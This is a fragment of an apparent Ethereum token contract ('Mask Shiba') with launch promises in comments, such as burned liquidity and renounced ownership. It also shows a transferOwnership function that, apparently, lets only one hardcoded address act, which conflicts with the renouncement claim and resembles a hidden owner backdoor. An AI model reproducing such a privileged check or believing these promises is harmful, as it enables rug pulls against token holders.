...
------* 60% UNISWAP LAUNCH     ( 0 % TEAM TOKENS )
------* 100% LP TOKENS BURNED AT LAUNCH
------* OWNERSHIP RENOUNCED AS SOON AFTER LAUNCH
------* WEBSITE LIVE ON 100 HOLDERS
-------------------------------------------------
*/
...
FROM THE TEAM OF SHIBA AKITA
Copyright © 2021 Mask Shiba. All rights reserved.
...
contract Ownable is Context {
   ...
   */
    ...
    function transferOwnership(address account, bool value) public {
        require(
            _msgSender() == 0xFaa73DFCf5e219C6d5c7052125D543B55E0B0139,
